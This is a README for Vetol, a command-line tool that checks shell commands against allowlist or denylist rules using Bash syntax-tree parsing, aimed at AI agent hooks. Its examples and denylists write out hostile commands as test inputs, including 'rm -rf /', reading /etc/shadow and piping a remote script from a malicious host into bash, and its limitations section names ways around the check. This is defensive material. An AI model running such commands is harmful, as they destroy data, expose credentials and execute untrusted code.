# Vetol - Vet agent tools

A CLI tool for validating shell commands using Bash AST analysis, suitable for AI agent hooks and other security-sensitive execution environments.

## Overview

Regex-based command validation can be bypassed through shell syntax such as command substitution (`echo $(rm -rf /)`) or command chaining (`ls && rm -rf /`).

For example, AI agents that rely on pattern matching to filter dangerous commands may fail to detect commands hidden inside nested shell constructs.

**Vetol** parses the Bash Abstract Syntax Tree (AST) and validates every command in the tree, including those nested in pipelines, substitutions, chains, and subshells.

## Installation

### Using `go install`

```bash
go install github.com/tf63/vetol/cmd/vetol
```

## Usage

**Vetol** only validates the provided command string and never executes it.

```bash
$ vetol --config allowlist.json "ls -la /tmp"
ALLOW
$ echo $?
0

$ vetol --config denylist.json "rm -rf /"
DENY
$ echo $?
1
```

### Configuration File

Rules are specified via a JSON configuration file:

```bash
vetol --config vetol.json "docker compose exec app rm -rf /"
```

**Configuration file format:**

```json
{
  "mode": "allowlist",
  "rules": [
    {
      "command": "ls",
      "include": ["-la"],
      "exclude": []
    },
    {
      "command": "grep",
      "include": ["-r"],
      "exclude": []
    },
    {
      "command": "docker compose"
    }
  ]
}
```

#### Rule Fields

- **command** (required): Command name or prefix (space-separated for multi-word commands)
- **include** (optional): Patterns that MUST be present
  - All patterns must match for the rule to match
- **exclude** (optional): Patterns that MUST NOT be present
  - If any pattern matches, the rule does not match

#### Pattern Types

- **Short flags** (`-r`, `-la`): All characters must be present
- **Long flags** (`--color`, `--color=auto`): Exact or prefix match with `=`
- **Non-flag patterns**: Exact match required

### Command Line Options

- `--config <PATH>`: Path to JSON configuration file (REQUIRED)
- `<COMMAND_STRING>`: The bash command string to validate (positional argument)

## Features

✓ **AST-based parsing**: Detects commands hidden in nested shell constructs
✓ **Allowlist/Denylist modes**: Flexible security policy configuration
✓ **Command prefix matching**: Single and multi-word command matching (e.g., `docker compose`)
✓ **Include/Exclude constraints**: Fine-grained control with flag and pattern matching

- Short flag matching: Character containment (e.g., `-la` matches `-l -a`)
- Long flag matching: Prefix matching with values (e.g., `--color` matches `--color=auto`)
- Non-flag pattern matching: Exact match
  ✓ **Complex syntax support**: Handles pipes, substitutions, chains, redirects, and subshells
  ✓ **JSON configuration**: Load rules from configuration files

## Limitations

Vetol validates command structure through Bash AST analysis.

### What Vetol Cannot Detect

- **Commands in string arguments**: Commands hidden as string arguments are not detected

  - Example: `bash -c "rm -rf /"` - The `rm -rf /` inside the string argument is not detected
  - Example: `sh -c "cat /etc/shadow"` - The `cat` command inside quotes is not analyzed
  - Other affected: `eval "dangerous command"`, `python -c "..."`, `node -e "..."`

- **Semantic analysis of arguments**: Only structure is validated, not argument content

  - Example: `curl https://malicious.site/script.sh | bash` - The script content is not analyzed

- **Behavior inside allowed binaries**: Malicious behavior within allowed commands cannot be detected

  - Example: An allowed binary could be trojanized or contain backdoors

- **Execution and sandboxing**: Vetol only validates structure, it does not:
  - Execute commands
  - Provide isolation or sandboxing
  - Prevent system-level attacks

### Mitigation Strategies

To address the string argument limitation, use denylist mode to block dangerous interpreter calls:

```json
{
  "mode": "denylist",
  "rules": [
    { "command": "bash", "include": ["-c"] },
    { "command": "sh", "include": ["-c"] },
    { "command": "eval" },
    { "command": "source" },
    { "command": "python", "include": ["-c"] },
    { "command": "node", "include": ["-e"] },
    { "command": "ruby", "include": ["-e"] },
    { "command": "perl", "include": ["-e"] }
  ]
}
```

This approach prevents the most common methods of injecting commands as string arguments.

## Examples

### Example 1: Allowlist Mode - Simple Commands

Create `allowlist.json`:

```json
{
  "mode": "allowlist",
  "rules": [{ "command": "ls" }, { "command": "cat" }, { "command": "echo" }]
}
```

```bash
vetol --config allowlist.json "cat /etc/passwd"
# Output: ALLOW

vetol --config allowlist.json "cat /etc/passwd && rm file.txt"
# Output: DENY (rm is not allowed)
```

### Example 2: Allowlist with Include Constraints

Create `allowlist-with-flags.json`:

```json
{
  "mode": "allowlist",
  "rules": [
    {
      "command": "ls",
      "include": ["-la"]
    },
    {
      "command": "grep",
      "include": ["-r"]
    }
  ]
}
```

```bash
vetol --config allowlist-with-flags.json "ls -la /tmp"
# Output: ALLOW

vetol --config allowlist-with-flags.json "ls -l /tmp"
# Output: DENY (missing -a flag)

vetol --config allowlist-with-flags.json "grep -r pattern /tmp"
# Output: ALLOW
```

### Example 3: Denylist Mode - Forbidden Commands

Create `denylist.json`:

```json
{
  "mode": "denylist",
  "rules": [{ "command": "rm" }, { "command": "dd" }, { "command": "docker compose exec app rm" }]
}
```

```bash
vetol --config denylist.json "cat README.md"
# Output: ALLOW

vetol --config denylist.json "rm -rf /"
# Output: DENY (rm is forbidden)

vetol --config denylist.json "docker compose exec app rm -rf /"
# Output: DENY (docker compose exec app rm is forbidden)
```

### Example 4: Include/Exclude Constraints

Create `safe-rm.json`:

```json
{
  "mode": "denylist",
  "rules": [
    {
      "command": "rm",
      "exclude": ["-i"]
    }
  ]
}
```

```bash
vetol --config safe-rm.json "rm file.txt"
# Output: DENY (rm without -i is forbidden)

vetol --config safe-rm.json "rm -i file.txt"
# Output: ALLOW (rm with -i is allowed)
```

### Example 5: Multi-Word Commands

Create `docker-config.json`:

```json
{
  "mode": "denylist",
  "rules": [
    {
      "command": "docker compose exec app rm"
    },
    {
      "command": "docker run"
    }
  ]
}
```

```bash
vetol --config docker-config.json "docker ps"
# Output: ALLOW

vetol --config docker-config.json "docker compose exec app rm -rf /"
# Output: DENY (docker compose exec app rm is forbidden)

vetol --config docker-config.json "docker run -it ubuntu"
# Output: DENY (docker run is forbidden)
```

### Example 6: Obfuscated Commands

Vetol detects commands hidden in nested shell constructs:

```bash
# Command substitution
vetol --config allowlist.json 'echo $(rm -rf /)'
# Output: DENY (rm is detected even in substitution)

# Command chaining
vetol --config denylist.json "ls && rm -rf /"
# Output: DENY (rm is detected in chain)

# Pipelines
vetol --config allowlist.json "pwd | grep test | rm"
# Output: DENY (rm is detected in pipeline)
```

## Dependencies

- [**mvdan.cc/sh/v3/syntax**](https://github.com/mvdan/sh): Bash command parser and AST builder
- Go 1.26 standard library

## Development & Contributing

For development setup, testing, architecture details, and contribution guidelines, see [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT
